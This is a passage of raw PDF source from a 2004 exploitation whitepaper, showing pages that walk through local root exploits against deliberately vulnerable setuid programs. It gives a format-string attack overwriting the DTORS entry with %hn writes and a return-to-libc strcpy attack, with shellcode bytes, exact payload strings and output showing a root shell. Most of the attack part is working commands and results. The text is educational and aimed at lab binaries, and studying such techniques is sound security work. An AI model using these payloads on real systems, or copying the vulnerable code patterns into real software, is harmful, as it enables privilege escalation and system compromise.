T* ([steve@covertsystems research]$ cat > vuln.c << EOF) Tj
T* (#include <stdio.h>) Tj
T* ( ) Tj
T* (int main\(int argc, char **argv\) {) Tj
T* ( ) Tj
T* (  char buffer[256];) Tj
T* ( ) Tj
T* (  snprintf\(buffer, sizeof\(buffer\), "%s", argv[1]\);) Tj
T* (  fprintf\(stdout, buffer\);) Tj
T* (}) Tj
T* (EOF) Tj
T* ([steve@covertsystems research]$ sudo gcc vuln.c -o vuln) Tj
T* ([steve@covertsystems research]$ sudo chown root.root ./vuln) Tj
T* ([steve@covertsystems research]$ sudo chmod 4755 ./vuln) Tj
T* ([steve@covertsystems research]$ ls -l ./vuln) Tj
T* (-rwsr-xr-x    1 root     root        11670 Mar  9 00:22 ./vuln) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (Format string exploitation is not as hard as it seems, a good binary / hex) Tj
T* (calculator such as: pcalc is an extremely useful tool for getting the right ) Tj
T* (values to be used in the creation of the format string.) Tj
T* () Tj
T* (As is normal for commandline exploit sequences we must supply a working) Tj
T* (shellcode up in an enviroment variable.) Tj
T* () Tj
T* ([steve@covertsystems research]$ gcc shell2string.c) Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(8) Tj
/F1 10 Tf
ET
endstream
endobj
53 0 obj
2691
endobj
54 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 55 0 R
/Rotate 0
>>
endobj
55 0 obj
<<
/Length 56 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* ([steve@covertsystems research]$ ./a.out) Tj
T* (Bytes: 33) Tj
T* ([steve@covertsystems research]$ xxd -g1 tinyshell) Tj
T* (0000000: 31 c0 31 db b0 46 cd 80 31 c0 31 d2 52 68 2f 2f  1.1..F..1.1.Rh//) Tj
T* (0000010: 73 68 68 2f 62 69 6e 89 e3 52 53 89 e1 b0 0b cd  shh/bin..RS.....) Tj
T* (0000020: 80) Tj
T* ([steve@covertsystems research]$ export CODE=`cat tinyshell`) Tj
T* ([steve@covertsystems research]$ echo 'main\(\){printf\("%p\\n",getenv\("CODE"\)\);}' >) Tj
T* (code.c ; gcc code.c -o code ; ./code ; rm -rf code*) Tj
T* (0xbfffff4a) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (The first thing we need to determine is the offset to a user-space region on ) Tj
T* (the stack. This is an area that we can control and is vital to the success of) Tj
T* (the format string exploitation.) Tj
T* () Tj
T* (There are two methods to determine this offset.) Tj
T* () Tj
T* (The first method is to supply a range of %x or %p specifiers to pop from the) Tj
T* (stack until our user supplied data is returned such as:) Tj
T* () Tj
T* ([steve@covertsystems research]$ ./vuln AAAA%p%p%p%p%p%p%p) Tj
T* (AAAA0x80484b40xbffffa9e0x414141410x702570250x702570250x702570250x7025) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (As we can see our string of A's \(0x41414141\) is at offset 3) Tj
T* () Tj
T* (The second method is to use the placement specifier $ which is done as follows:) Tj
T* () Tj
T* ([steve@covertsystems research]$ ./vuln AAAA%1\\$p) Tj
T* (AAAA0x80484b4[steve@covertsystems research]$ ./vuln AAAA%2\\$p) Tj
T* (AAAA0xbffffaa8[steve@covertsystems research]$ ./vuln AAAA%3\\$p) Tj
T* (AAAA0x41414141[steve@covertsystems research]$) Tj
T* () Tj
T* (This placement specifier is escaped with the \\ for reasons of the command line ) Tj
T* (usage, however as you can see the number supplied for each occurance returns ) Tj
T* (whatever is at that offset. And we see that at the third placement we have ) Tj
T* (returned our string of A's.) Tj
T* () Tj
T* (For the purpose of exploitation, we need an address to overwrite with the ) Tj
T* (shellcode address. This is where the DTOR_END address of the vulnerable process) Tj
T* (comes in handy, we can use this address because it is called when the program ) Tj
T* (exits.) Tj
T* () Tj
T* ([steve@covertsystems research]$ readelf -a ./vuln | grep DTOR_END) Tj
T* (    69: 0804959c     0 OBJECT  LOCAL  DEFAULT   19 __DTOR_END__) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (We now have two important addresses at our disposal plus our offset, however ) Tj
T* (we need to set these addresses up as a format string. In order to do this we ) Tj
T* (must take note that we shall be writing the DTOR_END address first in two ) Tj
T* (parts.) Tj
T* () Tj
T* (We shall write to the lowest half of the address first, then to the highest ) Tj
T* (half of the address after that. Imagine the following:) Tj
T* () Tj
T* (0x0804959c    <---= lowest) Tj
T* () Tj
T* (0x0804959c+2) Tj
T* (0x0804959e    <---= highest) Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(9) Tj
/F1 10 Tf
ET
endstream
endobj
56 0 obj
3081
endobj
57 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 58 0 R
/Rotate 0
>>
endobj
58 0 obj
<<
/Length 59 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* () Tj
T* (Which means, that the beginning of our format string shall look like this.) Tj
T* () Tj
T* ("\\x9c\\x95\\x04\\x08\\x9e\\x95\\x04\\x08") Tj
T* () Tj
T* (However we need to write to those addresses and this is where the printf) Tj
T* (format specifier %hn comes into play, which is the \(short write\). We shall ) Tj
T* (write to those addresses in two parts using the following principles.) Tj
T* () Tj
T* ([steve@covertsystems research]$ printf "\\x9c\\x95\\x04\\x08\\x9e\\x95\\x04\\x08" > fmt) Tj
T* ([steve@covertsystems research]$ pcalc 0xff4a) Tj
T* (        65354           0xff4a          0y1111111101001010) Tj
T* ([steve@covertsystems research]$ pcalc 0xff4a-8) Tj
T* (        65346           0xff42          0y1111111101000010) Tj
T* ([steve@covertsystems research]$ pcalc 0x1bfff-0xff4a) Tj
T* (        49333           0xc0b5          0y1100000010110101) Tj
T* ([steve@covertsystems research]$ echo -n "%.65346u%3\\$hn" >> fmt) Tj
T* ([steve@covertsystems research]$ echo -n "%.49333u%4\\$hn" >> fmt) Tj
T* ([steve@covertsystems research]$ ./vuln `cat fmt`) Tj
T* (<snip>) Tj
T* (00000000000000000000000000000000000000000000000000000000000000000000000000000000) Tj
T* (00000000000000000000000000000000000000000000000000000000000000000000000000000000) Tj
T* (00000000000000000000000000000000000000000000000000000000000000000000000000000000) Tj
T* (00000000000000000000000000000000000000000000000000000000000000000000000000000000) Tj
T* (000000000000000000000000000000000000000000000000000000000000sh-2.05b$ id) Tj
T* (uid=0\(root\) gid=500\(steve\) groups=500\(steve\)) Tj
T* (sh-2.05b$ exit) Tj
T* (exit) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (The thing to remember with this sequence is that we are subtracting 8 from the) Tj
T* (lowest half of the shellcode address, due to the reason that the %hn will write) Tj
T* (65346 zeros, plus the 8 bytes already written as part of the format string ...) Tj
T* ("\\x9c\\x95\\x04\\x08\\x9e\\x95\\x04\\x08" which gives a total write of: 65354 bytes) Tj
T* () Tj
T* (This will write half of the shellcode address: 0xff4a to 0x804959c) Tj
T* () Tj
T* (The next half address will be written to 0x804959e which shall complete the) Tj
T* (shellcode address overwrite over of the DTOR_END address. The one thing we ) Tj
T* (did was round the shellcode address to: 0x1bfff which when 0xff4a is subtracted) Tj
T* (from, will return a value that we can use to create a full address of:) Tj
T* (0xbfffff4a) Tj
T* () Tj
T* () Tj
T* (e:  Return-to-libc exploitation) Tj
T* (~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (Sample vulnerable process.) Tj
T* () Tj
T* ([steve@covertsystems research]$ cat > vuln.c << EOF) Tj
T* (#include <stdio.h>) Tj
T* (#include <string.h>) Tj
T* (#include <stdlib.h>) Tj
T* ( ) Tj
T* (#define MAX 768) Tj
T* ( ) Tj
T* (int vector\(char *buffer, char *ptr\)  {) Tj
T* ( ) Tj
T* (  strcpy\(buffer, ptr\);) Tj
T* (  return EXIT_SUCCESS;) Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(10) Tj
/F1 10 Tf
ET
endstream
endobj
59 0 obj
3029
endobj
60 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 61 0 R
/Rotate 0
>>
endobj
61 0 obj
<<
/Length 62 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* (}) Tj
T* ( ) Tj
T* (int main\(int argc, char **argv\)  {) Tj
T* ( ) Tj
T* (  char pattern[MAX];) Tj
T* ( ) Tj
T* (  vector\(pattern, argv[1]\);) Tj
T* (  fprintf\(stdout, "Pattern: %s\\n", pattern\);) Tj
T* ( ) Tj
T* (  return EXIT_SUCCESS;) Tj
T* (}) Tj
T* (EOF) Tj
T* ([steve@covertsystems research]$ sudo gcc vuln.c -o vuln) Tj
T* ([steve@covertsystems research]$ sudo chown root.root ./vuln) Tj
T* ([steve@covertsystems research]$ sudo chmod 4755 ./vuln) Tj
T* ([steve@covertsystems research]$ ls -l ./vuln) Tj
T* (-rwsr-xr-x    1 root     root        11670 Mar  9 00:22 ./vuln) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (Return-to-libc exploitation is a reasonably new concept and can be very useful) Tj
T* (in getting around non-executable stacks. However, for the purposes outlined) Tj
T* (in this paper we shall be using a far simplier method as a demonstration of ) Tj
T* (return-to-libc.) Tj
T* () Tj
T* (Our aim will be to copy the shellcode address using the libc function strcpy\(\),) Tj
T* (to the .data section of the vulnerable process, by doing so we manage to get) Tj
T* (our shellcode to execute and provide us hopefully with a suid shell.) Tj
T* () Tj
T* ([steve@covertsystems research]$ gcc shell2string.c) Tj
T* ([steve@covertsystems research]$ ./a.out) Tj
T* (Bytes: 33) Tj
T* ([steve@covertsystems research]$ xxd -g1 tinyshell) Tj
T* (0000000: 31 c0 31 db b0 46 cd 80 31 c0 31 d2 52 68 2f 2f  1.1..F..1.1.Rh//) Tj
T* (0000010: 73 68 68 2f 62 69 6e 89 e3 52 53 89 e1 b0 0b cd  shh/bin..RS.....) Tj
T* (0000020: 80) Tj
T* ([steve@covertsystems research]$ export CODE=`cat tinyshell`) Tj
T* ([steve@covertsystems research]$ echo 'main\(\){printf\("%p\\n",getenv\("CODE"\)\);}' >) Tj
T* (code.c ; gcc code.c -o code ; ./code ; rm -rf code*) Tj
T* (0xbfffff4a) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (Our next step is to get the .plt entry for strcpy\(\) from the vulnerable process,) Tj
T* (and this can be achieved with the following command:) Tj
T* () Tj
T* ([steve@covertsystems research]$ readelf -a ./vuln | grep strcpy) Tj
T* (080495b0  00000607 R_386_JUMP_SLOT   080482c4   strcpy) Tj
T* (     6: 080482c4    48 FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.0 \(2\)) Tj
T* (   110: 080482c4    48 FUNC    GLOBAL DEFAULT  UND strcpy@@GLIBC_2.0) Tj
T* ([steve@covertsystems research]$) Tj
T* ( ) Tj
T* (We can see here that the .plt entry for strcpy\(\) is: 0x080482c4) Tj
T* (The other address we need is the .data section address from within the process ) Tj
T* (and this can be achieved with a similar command.) Tj
T* () Tj
T* ([steve@covertsystems research]$ readelf -a ./vuln | grep .data) Tj
T* (  [14] .rodata           PROGBITS        08048498 000498 000015 00   A  0   0  4) Tj
T* (  [16] .data             PROGBITS        080494b4 0004b4 00000c 00  WA  0   0  4) Tj
T* (   02     .interp .note.ABI-tag .hash .dynsym .dynstr .gnu.version .gnu.version_) Tj
T* (r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame) Tj
T* (   03     .data .dynamic .ctors .dtors .jcr .got .bss) Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(11) Tj
/F1 10 Tf
ET
endstream
endobj
62 0 obj
3137
endobj
63 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 64 0 R
/Rotate 0
>>
endobj
64 0 obj
<<
/Length 65 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* (    99: 080494b4     0 NOTYPE  WEAK   DEFAULT   16 data_start) Tj
T* (   101: 080495b8     0 NOTYPE  GLOBAL DEFAULT  ABS _edata) Tj
T* (   106: 080494b4     0 NOTYPE  GLOBAL DEFAULT   16 __data_start) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (The required address: 0x080494b4) Tj
T* () Tj
T* (We now have all the required data to exploit this using a return-to-libc call.) Tj
T* () Tj
T* ([steve@covertsystems research]$ ./vuln `perl -e 'printf "A"x768 . ) Tj
T* ("\\xc4\\x82\\x04\\x08BBBB\\xb4\\x94\\x04\\x08\\x4a\\xff\\xff\\xbf"'`) Tj
T* (Pattern: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj
T* (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj
T* (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj
T* (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj
T* (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj
T* (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj
T* (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj
T* (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj
T* (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) Tj
T* (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAƒÇBBBB??J???) Tj
T* (sh-2.05b$ id) Tj
T* (uid=0\(root\) gid=500\(steve\) groups=500\(steve\)) Tj
T* (sh-2.05b$ exit) Tj
T* (exit) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (There are ways we can use the return-to-libc method to provide us with a suid ) Tj
T* (shell without the use of shellcode, though that method requires the use of ) Tj
T* (several system calls chained together which is a challenge in itself, but can ) Tj
T* (be achieved quite reasonably.) Tj
T* () Tj
T* (This demonstration is mild, and there are other examples that may provide a) Tj
T* (better understanding of return-to-libc exploitation. Try to rememeber the) Tj
T* (layout of memory regarding **argv ... As the bases of return-to-libc is to) Tj
T* (follow the convention of that principal.) Tj
T* () Tj
T* (Example:) Tj
T* (|     buffer     |    padding   |   ebp   |   eip   |  argv[0]  |  argv[1]  |...) Tj
T* () Tj
T* (                                          | system\(\)|   JUNK    |  ENV ptr  |) Tj
T* () Tj
T* (ENV ptr would be a pointer to a string such as:) Tj
T* () Tj
T* ([steve@covertsystems research]$ export SH="/bin/sh") Tj
T* ([steve@covertsystems research]$ echo 'main\(\){printf\("%p\\n",getenv\("SH"\)\);}' >) Tj
T* (code.c ; gcc code.c -o code ; ./code ; rm -rf code*) Tj
T* (0xbfffff4a) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (From this quick illustration you would be provided with a shell, though it ) Tj
T* (would not provide a suid shell without more advanced chaining of system calls. ) Tj
T* (Though hopefully I have given you some food for thought.) Tj
T* () Tj
T* () Tj
T* () Tj
T* () Tj
T* () Tj
T* () Tj
T* () Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(12) Tj
/F1 10 Tf
ET
endstream
endobj
65 0 obj
3155
endobj
66 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 67 0 R
/Rotate 0
/Annots [ 1 0 R 2 0 R 3 0 R 4 0 R 5 0 R 6 0 R 7 0 R 8 0 R 9 0 R 10 0 R ]
>>
endobj
67 0 obj
<<
/Length 68 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* (IV.  Summary) Tj
T* (~~~~~~~~~~~~) Tj
T* () Tj
T* (From this whitepaper, I have attempted to describe a few of the more common) Tj
T* (types of vulnerabilities together with a more commandline sequence approach) Tj
T* (for exploitation. The aim of this paper is to not get bogged down in the) Tj
T* (details of exploitation, but rather to be more of a guide to help get an) Tj
T* (overall picture.) Tj
T* () Tj
T* (Exploit research and development is a highly interesting area of research,) Tj
T* (and hopefully I have given the reader some food for thought, and an interest) Tj
T* (to delve even deeper into the subject.) Tj
T* () Tj
T* (The various sections relating to the different type of vulnerabilities are) Tj
T* (very basic to say the least. Over time and with persistance, I assure you ) Tj
T* (that you could find many other ways to exploit the vulnerabilities, and this) Tj
T* (is why exploit research can be so rewarding.) Tj
T* () Tj
T* (Good luck and Happy Hacking!) Tj
T* () Tj
T* (SolarIce \(c\) 2004) Tj
T* () Tj
T* () Tj
T* (V.   References) Tj
T* (~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (Articles:) Tj
T* (~~~~~~~~~) Tj
T* () Tj
T* (Smashing The Stack For Fun And Profit) Tj
T* (http://www.phrack.org/phrack/49/P49-14) Tj
T* () Tj
T* (Advances in format string exploitation) Tj
T* (http://www.phrack.org/phrack/59/p59-0x07.txt) Tj
T* () Tj
T* (w00w00 heap exploitation) Tj
T* (http://www.w00w00.org/files/articles/heaptut.txt) Tj
T* () Tj
T* (Vudo malloc tricks) Tj
T* (http://www.phrack.org/phrack/57/p57-0x08) Tj
T* () Tj
T* (Once upon a free\(\)) Tj
T* (http://www.phrack.org/phrack/57/p57-0x09) Tj
T* () Tj
T* (Advanced return-into-lib\(c\) exploits) Tj
T* (http://www.phrack.org/phrack/58/p58-0x04) Tj
T* () Tj
T* (Bypassing StackGuard and StackShield) Tj
T* (http://www.phrack.org/phrack/56/p56-0x05) Tj
T* () Tj
T* (Stack & Format vulnerabilities) Tj
T* (http://www.core-sec.com/examples/core_format_strings.pdf) Tj
T* (http://www.core-sec.com/examples/core_vulnerabilities.pdf) Tj
T* () Tj
T* (Tools:) Tj
T* (~~~~~~) Tj
T* () Tj
T* (pcalc) Tj
T* (http://www.ibiblio.org/pub/Linux/apps/math/calc/pcalc-000.tar.gz) Tj
T* () Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(13) Tj
/F1 10 Tf
ET
endstream
endobj
68 0 obj
2236
endobj
27 0 obj
<<
/Type /Catalog
/Pages 28 0 R
>>
endobj
28 0 obj
<<
/Type /Pages
/Count 13
/MediaBox [ 0 0 612 792 ]
/Kids [ 30 0 R 33 0 R 36 0 R 39 0 R 42 0 R 45 0 R 48 0 R 51 0 R 54 0 R 57 0 R 60 0 R 63 0 R 66 0 R ]
>>
endobj
xref
0 69
0000000000 65535 f 
0000000015 00000 n 
0000000172 00000 n 
0000000335 00000 n 
0000000502 00000 n 
0000000661 00000 n 
0000000820 00000 n 
0000000979 00000 n 
0000001138 00000 n 
0000001313 00000 n 
0000001489 00000 n 
0000001671 00000 n 
0000001884 00000 n 
0000003986 00000 n 
0000004082 00000 n 
0000004186 00000 n 
0000004287 00000 n 
0000004395 00000 n 
0000004493 00000 n 
0000004599 00000 n 
0000004702 00000 n 
0000004812 00000 n 
0000004912 00000 n 
0000005014 00000 n 
0000005114 00000 n 
0000005220 00000 n 
0000005299 00000 n 
0000045001 00000 n 
0000045052 00000 n 
0000005384 00000 n 
0000005616 00000 n 
0000005710 00000 n 
0000008195 00000 n 
0000008216 00000 n 
0000008310 00000 n 
0000011168 00000 n 
0000011189 00000 n 
0000011283 00000 n 
0000013971 00000 n 
0000013992 00000 n 
0000014086 00000 n 
0000017369 00000 n 
0000017390 00000 n 
0000017484 00000 n 
0000020184 00000 n 
0000020205 00000 n 
0000020299 00000 n 
0000023518 00000 n 
0000023539 00000 n 
0000023633 00000 n 
0000026564 00000 n 
0000026585 00000 n 
0000026679 00000 n 
0000029424 00000 n 
0000029445 00000 n 
0000029539 00000 n 
0000032674 00000 n 
0000032695 00000 n 
0000032789 00000 n 
0000035872 00000 n 
0000035893 00000 n 
0000035987 00000 n 
0000039178 00000 n 
0000039199 00000 n 
0000039293 00000 n 
0000042502 00000 n 
0000042523 00000 n 
0000042690 00000 n 
0000044980 00000 n 
trailer
<<
/Size 69
/Root 27 0 R
/Info 11 0 R
>>
startxref
45224
%%EOF
